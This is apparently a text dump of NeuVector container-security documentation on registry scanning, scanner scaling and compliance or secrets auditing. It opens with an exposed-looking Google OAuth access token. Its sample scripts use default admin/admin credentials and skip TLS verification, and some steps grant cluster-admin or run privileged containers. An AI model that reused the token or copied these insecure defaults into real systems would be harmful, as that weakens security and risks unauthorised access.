ya29.a0AfH6SMAvyZ2zkD3MZD_K8Lqr7qkIsRkGNqhAGthJ_A7lp8OGRe7xh5KmuQY-VJfqu83C9e1gi7A_m1InNm8QIoTGf9WHXnOeAr1gT_O6b6K667NUz1_YDunjdW09jt0XvcBGQaxjJ3c4aHlxdehBFiE_9PMk13JDt_T6f0_6vzS7   Use the Token with NeuVector Repository Scanning​  The below example script incorporates the access token to trigger GCR repository scan.  _curCase_=`echo $0 | awk -F&quot;.&quot; '{print $(NF-1)}' | awk -F&quot;/&quot; '{print $NF}'` _DESC_=&quot;able to scan ubuntu:16.04 image&quot; _ERRCODE_=0 _ERRTYPE_=1 _RESULT_=&quot;pass&quot; # please remember to specify the controller ip address here _controllerIP_=&quot;10.1.24.252&quot; _controllerRESTAPIPort_=&quot;10443&quot; _neuvectorUsername_=&quot;admin&quot; _neuvectorPassword_=&quot;admin&quot; _registryURL_=&quot;https://us.gcr.io/&quot; # registry urls could also be gcr.io, eu.gcr.io, asia.gcr.io etc _registryUsername_=&quot;oauth2accesstoken&quot; _registryPassword_=$(gcloud auth print-access-token) _repository_=&quot;bionic-union-271100/alpine&quot; _tag_=&quot;latest&quot; curl -k -H &quot;Content-Type: application/json&quot; -d '{&quot;password&quot;: {&quot;username&quot;: &quot;'$_neuvectorUsername_'&quot;, &quot;password&quot;: &quot;'$_neuvectorPassword_'&quot;}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1 &gt; token.json _TOKEN_=`cat token.json | jq -r '.token.token'` echo `date +%Y%m%d_%H%M%S` scanning an image ... curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;request&quot;: {&quot;registry&quot;: &quot;'$_registryURL_'&quot;, &quot;username&quot;: &quot;'$_registryUsername_'&quot;, &quot;password&quot;: &quot;'$_registryPassword_'&quot;, &quot;repository&quot;: &quot;'$_repository_'&quot;, &quot;tag&quot;: &quot;'$_tag_'&quot;}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/scan/repository&quot; &gt; /dev/null 2&gt;&amp;1 &gt; scan_repository.json while [ `wc -c &lt; scan_repository.json` = &quot;0&quot; ]; do echo `date +%Y%m%d_%H%M%S` scanning is still in progress ... sleep 5 curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;request&quot;: {&quot;registry&quot;: &quot;'$_registryURL_'&quot;, &quot;username&quot;: &quot;'$_registryUsername_'&quot;, &quot;password&quot;: &quot;'$_registryPassword_'&quot;, &quot;repository&quot;: &quot;'$_repository_'&quot;, &quot;tag&quot;: &quot;'$_tag_'&quot;}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/scan/repository&quot; &gt; /dev/null 2&gt;&amp;1 &gt; scan_repository.json done echo `date +%Y%m%d_%H%M%S` log out curl -k -X 'DELETE' -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1 cat scan_repository.json | jq . rm *.json echo `date +%Y%m%d_%H%M%S` [$_curCase_] $_DESC_: $_RESULT_-$_ERRCODE_  ","version":"Next 🚧","tagName":"h3"},{"title":"Harbor Pluggable Scanner Module","type":0,"sectionRef":"#","url":"/next/scanning/registry/harbor","content":"","keywords":"","version":"Next 🚧"},{"title":"Scanning Harbor Registries Using the Pluggable Scanner​","type":1,"pageTitle":"Harbor Pluggable Scanner Module","url":"/next/scanning/registry/harbor#scanning-harbor-registries-using-the-pluggable-scanner","content":" NeuVector supports invoking the NeuVector scanner from Harbor registries through the pluggable scanner interface. This requires configuration of the connection to the controller (exposed API). The Harbor adapter calls controller endpoint to trigger a scan, which can scan automatically on push. Interrogation services can be used for periodic scans. Scan results from Federation Primary controllers ARE propagated to remote clusters.  note There is an issue with the HTTPS based adapter endpoint error: please ignore Test Connection error, it does work even though an error is shown (skip certificate validation).  Deploying the NeuVector Registry Adapter​  The 5.2 Helm chart contains options to deploy the registry adapter for Harbor. It can also be pulled manually from the neuvector/registry-adapter repo on Docker Hub. Options also include setting the Harbor registry request protocol and the basic authentication secret name.  After deployment of the adapter, it is necessary to configure this in Harbor.    The adapter endpoint must be entered, and the adapter connects to the controller, which is typically exposed as a service externally so the adapter can connect to it. In addition, authentication credentials for a valid NeuVector user must be entered.  Scanning Images from a Harbor Registry​  After successful deployment and connection to a controller, an image scan can be manually or automatically triggered from Harbor.    Periodic scans (scheduled) can be configured through Interrogation Services in Harbor, to make sure the latest CVE database is used to rescan images in registries.    Scan results can be viewed directly in Harbor.    Sample Deployment Yaml​  Samples for Kubernetes and OpenShift ","version":"Next 🚧","tagName":"h3"},{"title":"Parallel & Standalone Scanners","type":0,"sectionRef":"#","url":"/next/scanning/scanners","content":"","keywords":"","version":"Next 🚧"},{"title":"Increase Scanner Scalability with Multiple Scanners​","type":1,"pageTitle":"Parallel & Standalone Scanners","url":"/next/scanning/scanners#increase-scanner-scalability-with-multiple-scanners","content":" To increase scanner performance and scalability, NeuVector supports deploying multiple scanner pods which can, in parallel, scan images in registries. The controller assigns scanning tasks to each available scanner pod. Scanner pods can be scaled up or down easily as needed using Kubernetes.  Scanner pods should be deployed to separate nodes to spread the workload across different host resources. Remember that a scanner requires enough memory to pull and expand the image, so it should have available to it more than the largest image size to be scanned. If necessary, scanners can be placed on specific nodes or avoid placing multiple pods on one node using standard Kubernetes node labels, taints/tolerations, or node affinity configurations.  By default, NeuVector deploys 2 scanner pods, as part of the sample deployments in the section Deploying NeuVector. These replicasets can be scaled up or down as needed.  The scanner container the latest CVE database and is regularly updated (with 'latest' tag) by NeuVector. The updater redeploys the scanner, forcing a pull of the latest scanner image in order to get the latest CVE database. See the section Updating the CVE Database for more details on the updater.  Please note that in initial releases the presence and status of multiple scanners is only visible in Kubernetes with 'kubectl get pods -n neuvector' and will not be displayed in the web console.  Scan results from all scanners are shown in the Assets -&gt; Registries menu. Additional scanner monitoring features will be added in future releases.  Auto-scaling of Scanner Pods​  Scanner pods can be configured to auto-scale based on certain criteria. This will ensure that scanning jobs are handled quickly and efficiently, especially if there are thousands of images to be scanned or re-scanned. There are three possible settings: delayed, immediate, and disabled. When images are queued for scanning by the controller, it keeps a 'task count' of the queue size.  Delayed strategy: When lead controller continuously sees &quot;task count&quot; &gt; 0 for &gt; 90 seconds, a new scanner pod is started if maxScannerPods is not reached yetWhen lead controller continuously sees &quot;task count&quot; is 0 for &gt; 180 seconds, it scales down one scanner pod if minScannerPods is not reached yet Immediate strategy: Every time when lead controller sees &quot;task count&quot; &gt; 0, a new scanner pod is started if maxScannerPods is not reached yetWhen lead controller continuously sees &quot;task count&quot; is 0 for &gt; 180 seconds, it scales down one scanner pod if minScannerPods is not reached yet  Scanner auto-scaling is configured in Settings -&gt; Configuration. The minimumScannerPods setting sets the minimum scanner pods running at any time, while the maxScannerPods sets the maximum number of pods that the auto-scaling strategy can scale up to. NOTE: Setting a minimum value will not adjust the original scanner deployment replicaset value. The minimum value will be applied during the first scale up/down event.  important Scanner auto-scaling is not supported when scanner is deployed with an OpenShift operator, as the operator will always change the number of pods to its configured value.  Operations and Debugging​  Each scanner pod will query the registries to be scanned to pull down the complete list of available images and other data. Each scanner will then be assigned an image to pull and scan from the registry.  To inspect the scanner behavior, logs from each scanner pod can be examined using  kubectl logs &lt;scanner-pod-name&gt; -n neuvector   ","version":"Next 🚧","tagName":"h3"},{"title":"Performance Planning​","type":1,"pageTitle":"Parallel & Standalone Scanners","url":"/next/scanning/scanners#performance-planning","content":" Experiment with varying numbers of scanners on registries with a large number of images to observe the scan completion time behavior in your environment. 2-5 scanners as the replica setting should be sufficient for most cases.  When a scan task is assigned to a scanner, it pulls the image from the registry (after querying the registry for the list of available images). The amount of time it takes to pull the image (download) typically consumes the most time. Multiple scanners can be pulling images from the same registry in parallel, so the performance may be limited by registry or network bandwidth.  Large images will take more time to pull as well as need to be expanded to scan them, consuming more memory. Make sure each scanner has enough memory allocated to it to handle more than the largest expected image (10% more minimum).  Multiple scanner pods can be deployed to the same host/node, but considerations should be made to ensure the host has enough memory, CPU, and network bandwidth for maximizing scanner performance.  ","version":"Next 🚧","tagName":"h3"},{"title":"Standalone Scanner for Local Scanning​","type":1,"pageTitle":"Parallel & Standalone Scanners","url":"/next/scanning/scanners#standalone-scanner-for-local-scanning","content":" NeuVector supports standalone scanner deployments for local image scanning (which does not require a Controller). In the sample docker run below, the local image will be scanned and the results stored at the /var/neuvector locally. For local scanning, the image must be able to be accessed through the mounted docker.sock, otherwise a registry can be specified.  docker run --name neuvector.scanner --rm -e SCANNER_REPOSITORY=ubuntu -e SCANNER_TAG=16.04 -e SCANNER_ON_DEMAND=true -v /var/run/docker.sock:/var/run/docker.sock -v /var/neuvector:/var/neuvector neuvector/scanner   The following scanner environment variables can be used in the docker run command:  SCANNER_REGISTRY= url of the registry (optional instead of local scan)SCANNER_REPOSITORY= repository to scanSCANNER_TAG= version tagSCANNER_REGISTRY_USERNAME= user (optional instead of local scan)SCANNER_REGISTRY_PASSWORD= password (optional instead of local scan)SCANNER_SCAN_LAYERS= true or false (to return layered scan results)SCANNER_ON_DEMAND=true (required)CLUSTER_JOIN_ADDR (optional), CLUSTER_JOIN_PORT (optional) - to send results to controller for use in Admission control rules (Kubernetes deployed controller).SCANNER_CTRL_API_USERNAME (optional), SCANNER_CTRL_API_PASSWORD (optional) - used in conjunction with CLUSTER_JOIN_ADDR to authenticate with the specified username and password to the NeuVector Controller API.CLUSTER_ADVERTISED_ADDR (optional) - if scanner is on different host than controller, to send results for use in Admission control rules (Kubernetes deployed controller).  Host Scanning in Standalone Mode​  Use the following command to scan the host.  caution Requires privileged mode!  docker run --rm --privileged --pid=host neuvector/scanner -n neuvector   Manual Deployment of Multiple Scanners on Kubernetes​  To manually deploy scanners as part of an existing Kubernetes deployment, create a new role binding:  kubectl create rolebinding neuvector-admin --clusterrole=admin --serviceaccount=neuvector:default -n neuvector   Or for OpenShift  oc adm policy add-role-to-user admin system:serviceaccount:neuvector:default -n neuvector   Use the file below to deploy multiple scanners. Edit the replicas to increase or decrease the number of scanners running in parallel.  apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-scanner-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-scanner-pod strategy: type: RollingUpdate rollingUpdate: maxSurge: 1 maxUnavailable: 0 replicas: 2 template: metadata: labels: app: neuvector-scanner-pod spec: containers: - name: neuvector-scanner-pod image: neuvector/scanner imagePullPolicy: Always env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector # Commented out sections are required only for local build-phase scanning # - name: SCANNER_DOCKER_URL # value: tcp://192.168.1.10:2376 # volumeMounts: # - mountPath: /var/run/docker.sock # name: docker-sock # readOnly: true # volumes: # - name: docker-sock # hostPath: # path: /var/run/docker.sock restartPolicy: Always   Next, create or update the CVE database updater cron job. This will update the CVE database nightly.  apiVersion: batch/v1 kind: CronJob metadata: name: neuvector-updater-pod namespace: neuvector spec: schedule: &quot;0 0 * * *&quot; jobTemplate: spec: template: metadata: labels: app: neuvector-updater-pod spec: containers: - name: neuvector-updater-pod image: neuvector/updater imagePullPolicy: Always command: - /bin/sh - -c - TOKEN=`cat /var/run/secrets/kubernetes.io/serviceaccount/token`; /usr/bin/curl -kv -X PATCH -H &quot;Authorization:Bearer $TOKEN&quot; -H &quot;Content-Type:application/strategic-merge-patch+json&quot; -d '{&quot;spec&quot;:{&quot;template&quot;:{&quot;metadata&quot;:{&quot;annotations&quot;:{&quot;kubectl.kubernetes.io/restartedAt&quot;:&quot;'`date +%Y-%m-%dT%H:%M:%S%z`'&quot;}}}}}' 'https://kubernetes.default/apis/apps/v1/namespaces/neuvector/deployments/neuvector-scanner-pod' restartPolicy: Never  ","version":"Next 🚧","tagName":"h3"},{"title":"Registry Scanning Configuration","type":0,"sectionRef":"#","url":"/next/scanning/registry","content":"","keywords":"","version":"Next 🚧"},{"title":"Configure Registry Scanning​","type":1,"pageTitle":"Registry Scanning Configuration","url":"/next/scanning/registry#configure-registry-scanning","content":" To configure registries and repositories to be scanning, go to the Assets -&gt; Registries menu in the NeuVector console. Add or edit registries to be scanned. Use the Filter to define repositories or subsets of images to be scanned. If your registry requires access through a proxy, this can be configured in Settings -&gt; Configuration.    The registry will be scanned according to a schedule, which is configurable. By default, only new or updated images will be scanned. If you want to re-scan all applicable images whenever the CVE database is updated, select the Rescan After CVE DB Update button when configuring the registry. You can also select Layered Scan to show vulnerabilities by each layer in the image (note: layered scans can take longer and consume more resources to complete).  After the scan is completed you will see the results below it. Click on the repository/tag to see vulnerabilities and click on the vulnerability to see more info. You can also download the report in a CSV file or see the results in the Event logs.    The scan results include vulnerabilities by image layer, if this option was selected during registry/repository configuration, as well the compliance checks results. Click the compliance tab when viewing the scan results for the image to see compliance checks.  Scanning will also discover and list all Modules (ie, an inventory) in the image, as shown below. It will also summarize the vulnerability risk by module and list all vulnerabilities for each module.    Scanning is supported for images on public and private docker registries that are based on Native Docker, Amazon ECR, Redhat/Openshift, jFrog, Microsoft ACR, Sonatype Nexus, Harbor, Google cloud and other registries. The scan report for the image comprises of the vulnerability status of various packages and binaries in the image. The brief summary of the scan report can be sent via webhook using the Response rule configuration in Policy -&gt; Response Rules, or by Syslog by configuring a syslog server in Settings -&gt; Configuration. Results can also be viewed in the Event logs.  At least one repository filter is required (can't be left blank).  Repository filter examples​    Notes:  To scan all image tags, add filter as * or *:*. This works on all registry types except the public docker registry.Repository should be full name if organization is nil for public docker registry or add library before repository as given above.Create a virtual repository and add all local repository to it to scan all tags on a JFrog registry with the subdomain docker access method.Regular expressions can be used in a filter. For example alpine:3.[8|9].* will scan all 3.8.x and 3.9.x images and tags on docker hub.  Registry scan options​  Scan Layers: Provides vulnerability scan result for every image layer separatelyProvides information about commands executed, packages added in the layerImages size of each layer Auto Scan: Auto Scan is only supported with OpenShift imagestream integration. Proper role binding should be configured in advance.When Auto Scan is enabled, as soon as an image is pushed to the registry, the image scan will be scheduled. Periodical Scan: Enable periodic scan to scan periodicallyScan interval can set to be between 5 minutes to every 7 days.Because many Admission Control checks rely on image scan result, enabling periodical scan helps make sure Admission Control has the up-to-date information of the images.Note that NeuVector will scan images in a regsistry that are new/changed from the previous scan. Rescan after CVE DB update Enable this option to rescan all images after the vulnerability database is updated.  Configuring Proxy server for Registry​  Please go to Settings -&gt; Configuration to configure proxy settings for registry scanning.  Native Docker registry (also Quay and Harbor)​  Add Native Docker registry​  Choose Docker registry as typeGive unique name to the registryType registry URL with portProvide username and password if required by the registryAdd repository as filter in the below format Organization/repository:tagRepository can have wildcard with starting stringExample neuvector/all*:2*  Adding private docker registry with username/password, scan layers enabled, periodic scan for every 30 minutes enabled and * as filter to scan all tags from all repository.  Adding public docker registry for scanning without username/password and 2 repositories with wildcard, scan layers enabled and periodic scan enabled.  Adding public docker registry for scanning with username/password, wildcard repository, scan layers enabled, and periodic scan enabled.  Note for Quay:  Enter the top-level URL for your Quay registry; do not enter any directories to the path.You will need to generate an encrypted password in your Quay server/account, and use these credentials here. Then, pass filter(s) as described above.    Start scanning the Docker registry​  Select registry to be scannedClick start button to scanWait till status changes from scanning to idle Scanning time varies depending on the size of the repository    View the scan result​  Click on an image from images pane to view the scan result for the image.Access the scan result to find the vulnerability status of the image.Click download button to download scan result of the image if neededMove mouse in between CVE detail and images to get back to summary  Showing images scanned for the selected registry    Example showing layer scan result of an image, which shows vulnerabilities of each layer, layer size and commands run on each layer. In addition, there is a Compliance tab which shows the compliance test results for the image.    Amazon ECR Registry​  Ref: https://docs.aws.amazon.com/AmazonECR/latest/userguide/Registries.html  Add Amazon ECR registry​  Choose Amazon registry as typeGive unique name to the registryRegistry URL is automatically found with other informationSupply below information for the registry. Refer above amazon link to get below information Registry idRegionAccess key idSecret access key Add repository as filter in the following format Organization/repository:tagRepository can have wildcard with starting stringExample neuvector/all*:2*Organization can be empty if such image available in the registry* to scan all image tags    Redhat registry​  Ref: https://access.redhat.com/containers  Add Red Hat registry​  Choose Redhat registry as typeGive unique name to the registryType registry URL https://registry.connect.redhat.com/Provide username and password of the account used for managing registryAdd repository as filter in the below format Organization/repository:tagRepository can have wildcard with starting stringExample neuvector/all*:2** to scan all image tags    Openshift registry​  Add OpenShift registry with username and password​  Choose OpenShift registry as typeGive unique name to the registryType registry URL (obtain from the output of &quot;oc get is&quot; command in OpenShift network if it is different than default) Default registry URL https://docker-registry.default.svc:5000/ Provide username and password of the account used for managing registryAdd repository as filter in the below format Organization/repository:tagExample openshift/htt*:** to scan all image tags Enable auto scan to start the scan as soon as image is updated on OpenShift image stream.  Add OpenShift registry with token​  Choose OpenShift registry as typeGive unique name to the registryType registry URL (obtain from the output of &quot;oc get is&quot; command in OpenShift network if it is different than default) Default registry URL https://docker-registry.default.svc:5000/ Provide token of the service account which has access to all namespaces Check below note to create service account and get token.Create service account oc project defaultoc create sa nvqaoc get sa Assign cluster admin role to service account to read all registry oc adm policy add-cluster-role-to-user cluster-admin system:serviceaccount:default:nvqa Get token for the service account oc sa get-token nvqa Add repository as filter in the below format Organization/repository:tagExample openshift/htt*:** to scan all image tags Enable auto scan to start the scan as soon image is updated on OpenShift image stream.    Stability issues in Openshift 3.7 Registry​  In OpenShift 3.7, API calls to pull container image metadata or to download an image can fail randomly. It can also fail on random images in different scan runs. You may see incomplete image lists or scans may fail on some images when this happens. If this occurs, the repository can be rescanned.  JFrog Artifactory​  Adding JFrog Artifactory registry (Docker Access method – Repository Path) JFrog management page admin-&gt;HTTP Setting showing docker access method - Repository Path    Add JFrog Artifactory registry (Docker Access method – Repository Path)​  Choose JFrog Artifactory as typeGive a unique name to the registry Type the registry URL with port, for example http://10.1.7.122:8081/ Provide a username and password if required by the registryAdd the repository as a filter in the below format Organization/repository:tagRepository or tag can have wildcards at end, such as abc/*, abc/n*To scan all tags for a repository, for example alpine, use alpine:*The wildcard must be preceded by the full name, path, or starting string* to scan all tags  Adding JFrog Artifactory registry (Docker Access method – subdomain)​  JFrog management page admin-&gt;HTTP Setting showing docker access method – Sub Domain    Add JFrog Artifactory registry (Docker Access method – subdomain)  Choose JFrog Artifactory as typeGive a unique name to the registryType the registry URL with port, for example http://10.1.7.122:8081/Choose Subdomain as JFrog Docker Access MethodProvide a username and password if required by the registryAdd the repository as a filter in the below format Subdomain/repository:tagRepository or tag can have wildcards at end, such as abc/*, abc/n*To scan all tags for a repository, for example alpine, use alpine:*The wildcard must be preceded by the full name, path, or starting string* for scanning all tags from all subdomains  note Create a virtual repository and add all local and remote repository to it. Specify this virtual repository in the filter section to scan all tags from local and remote remote repository.  Adding subdomain based JFrog registry to scan images from docker-local subdomain    Adding subdomain based JFrog registry to scan all tags from all subdomains    Add JFrog Artifactory registry (Docker Access method – port)​  JFrog management page admin-&gt;HTTP Setting showing docker access method - Port    JFrog management page admin-&gt;Local Repository-&gt;docker-local repository-&gt; Advanced - showing repository URL and registry port 8181    JFrog management page admin-&gt;Local Repository-&gt;guo repository-&gt; Advanced - showing repository URL and registry port 8182    Choose JFrog Artifactory as typeGive a unique name to the registryType the registry URL with port, for example http://10.1.7.122:8181/ Every Registry name has unique port Choose Port as JFrog Docker Access MethodProvide a username and password if required by the registryAdd the repository as a filter in the below format Organization/repository:tagRepository or tag can have wildcards at end, such as abc/, abc/nTo scan all tags for a repository, for example alpine, use alpine:*The wildcard must be preceded by the full name, path, or starting string* for scanning all tags  Adding JFrog registry for port access method for registry docker-local with port 8181    Adding JFrog registry for port access method for registry with port 8182    Adding JFrog registry for port access method for the virtual registry with port 8188, which has all local registries added to it.    Showing scanned result for docker-local registry    Add SaaS JFrog Artifactory registry (Docker access method – Port)​  Choose JFrog Artifactory as type  Give a unique name to the registryType the registry URL, for example https://jfrogtraining-docker-nv-virtual.jfrog.ioChoose Port as JFrog Docker Access MethodProvide a username and password if required by the registryAdd the repository as a filter in the below format Organization/repository:tag* to scan all tags of all repository    Start Scanning a JFrog Artifactory Registry​  Select registry to be scannedClick start button to scanWait until status changes from scanning to idle Scanning time varies depending on the size of the repository  Google Container Registry​  Ref:https://cloud.google.com/container-registry/docs/advanced-authenticationhttps://cloud.google.com/container-registry/docs/advanced-authentication#json_key_file  Enable Cloud Resource Manager API for the project​  Google Cloud Platform-&gt;Choose Project-&gt;API and Services-&gt;Enable APIS and Services-&gt;Search “Cloud Resource Manager API”-&gt;Enable APIhttps://console.cloud.google.com/apis/library?project=nvtest-219600&amp;q=Cloud%20Resource%20Manager%20API (change project name)  Create key for container service account​  Google Cloud Platform--&gt;IAM--&gt;Service Account--&gt;account with container registry--&gt;CreateKey(action)--&gt;  Copy json file to client machine​  Add Google Container Registry from the NeuVector GUI​  Choose Google registry as typeGive unique name to the registryType registry URL. Sample https://gcr.io/ (this could also be us.gcr.io, eu.gcr.io etc)Paste all content above captured json file into JSON key.Add repository as filter in the below format Project-id/repository:tagExample nvtestid-1/neuvector*:** to scan all image tags  Start Scanning a Google Container Registry​  Select registry to be scannedClick start button to scanWait until status changes from scanning to idle Scanning time varies depending on the size of the repository  Azure Container Registry​  Ref:https://azure.microsoft.com/en-us/services/container-registry/  Obtain Azure container username and password as shown below​  Azure container registry -&gt; user-&gt; access keys-&gt;password  Showing azure portal username and password for container registry access    Add Azure Container Registry from the NeuVector GUI​  Choose Azure registry as typeGive unique name to the registryType registry URL. Sample https://neuvector.azure.io (obtain from azure portal) Container registry-&gt;user-&gt;Overview-&gt;Login Server Add username and password Azure container registry -&gt; user-&gt; access keys-&gt;password Add repository as filter in the below format repository:tagexample alpine:** to scan all image tags  Showing azure portal login server for Azure container registry    Adding Azure container registry to scan all tags    Start Scanning a Azure Container Registry​  Select registry to be scannedClick start button to scanWait until status changes from scanning to idle Scanning time varies depending on the size of the repository  Sonatype Nexus Docker registry​  Ref:https://help.sonatype.com/repomanager3/private-registry-for-dockerhttps://hub.docker.com/r/sonatype/nexus3/  Add Sonatype Nexus Docker registry​  Choose Sonatype Nexus as typeGive unique name to the registryType registry URL with portProvide username and password if required by the registryAdd repository as filter in the below format Organization/repository:tagRepository can have wildcard with starting stringExample neuvector/all*:2** to scan all image tags  Adding Sonatype Nexus docker registry with username/password and repository *:* for scanning    Start scanning Sonatype Nexus Docker registry​  Select registry to be scannedClick start button to scanWait till status changes from scanning to idle Scanning time varies depending on the size of the repository  Gitlab Container Registry​  Sample GitLab Environmnent Configurations​  sudo docker run --detach \\ --hostname gitlab \\ --env GITLAB_OMNIBUS_CONFIG=&quot;external_url 'http://10.1.7.73:9096'; gitlab_rails['lfs_enabled'] = true;&quot; \\ --publish 10.1.7.73:9095:9095 --publish 10.1.7.73:9096:9096 --publish 10.1.7.73:6222:22 \\ --name gitlab \\ --restart always \\ --volume /srv/gitlab/config:/etc/gitlab \\ --volume /srv/gitlab/logs:/var/log/gitlab \\ --volume /srv/gitlab/data:/var/opt/gitlab \\ gitlab/gitlab-ce:latest External_URL: http://10.1.7.73:9096 Registry_URL: https://10.1.7.73:9095   Obtain Gitlab private token as shown below​  Navigate to the settings page from the icon located at the upper-righthand corner of the GitLab login page as illustrated below:    Navigate to the Access_Tokens page as shown below from the User_Settings page:    Fill in all applicable fields, and click “Create personal access token” when ready to generate the access token:    Access token will no longer be available once the user has navigated away from the generated token page. Therefore, it is highly recommended to make a copy of the access token prior to navigating or closing the following page:    Obtaining External and Registry URLs​  External-URL: The external url is the API-Server's URL. Registry-URL: This can be obtained from the Container Registry page of the GitLab webconsole. One way to get to this page is navigating from the GitLab’s webconsole from Projects &gt; Your Projects &gt; Administrator / … &gt; Left-Pane (Container Registry) &gt; Mouse-over (root/.../)  The following is a sample screen-capture of the page that reveals both the External-URL and the Registry-URL:    Add Gitlab Registry from the NeuVector Console​  Choose Gitlab as the registry typeGive unique name to the registryType registry URL with portProvide username and password if required by the registryProvide Gitlab external URL and the private token obtained from the last section    note The Registry URL is used for pulling images into the NeuVector scanner-platform from GitLab to do registry scanning. While the External URL is used for retrieving a list of images, registries, and metadata used by the registry scanning feature.  IBM Cloud Container Registry​  Ref: https://www.ibm.com/cloud/container-registry  Add IBM Container registry​  Choose IBM Cloud Container Registry as typeGive unique name to the registryType registry URL https://us.icr.io/Provide iamapikey as username and the apikey below as password Create apikey from CLI ibmcloud iam api-key-create atibmKey Create apikey from GUI IBM Cloud-&gt;Manage-Access(IAM)-IBM Cloud API Keys Provide IBM Cloud Account Obtain IBM cloud account from CLI Ibmcloud cr info Add repository as filter in the below format Organization/repository:tagRepository can have wildcard with starting stringExample neuvector/all*:2* to scan all image tags Enable other parameters if needed    note The username for the registry authentication must be 'iamapikey'  Harbor Registry​  Use the same instructions as for the Native Docker registry, choosing Docker as the registry.  The filter field can not be left blank. Enter a repository filter, or add filter as * to scan all repositories. ","version":"Next 🚧","tagName":"h3"},{"title":"Compliance & CIS Benchmarks","type":0,"sectionRef":"#","url":"/next/scanning/scanning/compliance","content":"","keywords":"","version":"Next 🚧"},{"title":"Managing Compliance and CIS Benchmarks​","type":1,"pageTitle":"Compliance & CIS Benchmarks","url":"/next/scanning/scanning/compliance#managing-compliance-and-cis-benchmarks","content":" Compliance auditing with NeuVector includes CIS Benchmarks, custom checks, secrets auditing, and industry standard templates for PCI, GDPR and other regulations.  CIS Benchmarks automatically run by NeuVector include:  KubernetesDockerRed Hat OpenShift draft 'Inspired by CIS' benchmarksGoogle GKE  Compliance scan results can be seen for individual Assets in the Registries (for Images), Nodes, and Containers menus by selecting the relevant asset and clicking the Compliance tab.  The Security Risks -&gt; Compliance menu enables consolidated compliance reporting, similar to how the Vulnerabilities menu works.  Security Risks - Compliance and Compliance Profile​  Compliance results are show in the list by Category and Name. Categories include Docker, Kubernetes, OpenShift, and Custom. The names of each item correspond to the CIS benchmark. For example, K.4.2.3 corresponds to the Kubernetes CIS benchmark 4.2.3. Docker benchmarks are preceded with 'D' with the exception of Image related benchmarks, which are preceded by 'I'.  Use the Advanced filter to select compliance checks based on platform, host, namespace or industry standard, as shown below.    After applying the filter, only the relevant CIS benchmarks and custom checks will be shown, and a report can be generated and downloaded. This is how reports for standards such as PCI, HIPAA, GDPR and other standards can be generated.  The following screenshot shows an example of a secret found in an image scan.    Customizing Compliance Templates for PCI, GDPR, HIPAA, NIST and others​  The Compliance profile menu enables customization of the built-in templates for industry standards such as PCI and GDPR. These reports can be generated from the Security Risks -&gt; Compliance menu by selecting one of the standards to filter, then exporting. The NIST profile is for NIST SP 800-190.  To customize any compliance profile, select the industry standard (e.g. PCI), then enable or disable specific checks for that standard. Think of these as compliance 'tags' that are applied to each check in order to generate a compliance report for that industry standard.  Use the Action button to add or remove any compliance tag from that check.    In addition, you can select which 'Assets' are considered to be part of the compliance reports by clicking on the Assets tab. By default, all compliance templates are applied to Images, Nodes and Containers.    Use the Action button to add or remove compliance templates for assets.  Images. Select the standard(s) to be reported for Images.Nodes. Select the standard(s) to be reported for Nodes (hosts).Containers. Select the stadard(s) to be reported for Containers.  Alternatively, instead of restricting by the above criteria, compliance templates can be restricted to certain Namespaces. If this box is checked and namespace(s) added, reports will be generated for all assets which apply to these namespaces. This can be useful if, for example, the PCI template should only report on assets for namespaces which container PCI in-scope (applicable) workloads.    After the templates and assets are customized (if desired) in the Security Risks -&gt; Compliance Profiles menu, reports can be generated in the Security Risks -&gt; Compliance menu by opening the advanced filter and selecting the compliance template desired. For example, selecting GDPR will filter the display and reports for only the GDPR profile.  Secrets Auditing​  NeuVector checks for over 40 common types of secrets as part of the image compliance scans and run-time scans. In addition, custom compliance scripts can be configured for containers or hosts, and the DLP packet inspection feature can be used to check for secrets in network payloads.  The results for secrets auditing can be found in the Compliance section of image scans (Assets -&gt; Registries), containers (Assets -&gt; Containers), nodes (Assets -&gt; Nodes), and the compliance management menu (Security Risks -&gt; Compliance).  The following is an example of how secrets detected in an image scan will be displayed.    Here is a list of the types of secrets being detected.  General Private KeysGeneral detection of credentials including 'apikey', 'api_key', 'password', 'secret', 'passwd' etc.General passwords in yaml files including 'password', 'passwd', 'api_token' etc.General secrets keys in key/value pairsPutty Private keyXML Private keyAWS credentials / IAMFacebook client secretFacebook endpoint secretFacebook app secretTwitter client IdTwitter secret keyGithub secretSquare product IdStripe access keySlack API tokenSlack web hooksLinkedIn client IdLinkedIn secret keyGoogle API keySendGrid API keyTwilio API keyHeroku API keyMailChimp API keyMailGun API key ","version":"Next 🚧","tagName":"h3"},{"title":"Scanning & Compliance","type":0,"sectionRef":"#","url":"/next/scanning/scanning","content":"","keywords":"","version":"Next 🚧"},{"title":"Overview of NeuVector Scanning​","type":1,"pageTitle":"Scanning & Compliance","url":"/next/scanning/scanning#overview-of-neuvector-scanning","content":" Scanning is performed at all phases of the pipeline from Build to Registry to Run-Time, on various assets, as shown below.  Scan Type\tImage\tNode\tContainer\tOrchestratorVulnerabilities\tYes\tYes\tYes\tYes CIS Benchmarks\tYes\tYes\tYes\tYes Custom Compliance\tNo\tYes\tYes\tNo Secrets\tYes\tYes\tYes\tNo Modules\tYes\tN/A\tN/A\tN/A  Images are scanned either in Registry scanning or through Build-phase plug-ins such as Jenkins, CircleCI, Gitlab etc.  The CIS Benchmarks support by NeuVector include:  KubernetesDockerRed Hat OpenShift draft 'Inspired by CIS' benchmarksGoogle GKE  The open source implementation of these benchmarks can be found on the NeuVector Github page.  note Secrets can also be detected on Nodes and in Containers with Custom Scripts.  Kubernetes Resource Deployment File Scanning​  NeuVector is able to scan deployment yaml files for configuration assessments against Admission Control rules. This is useful to scan deployment yaml files early in the pipeline to determine if the deployment would violate any rules before attempting the deployment. Please see Configuration Assessment under Admission Controls for more details.  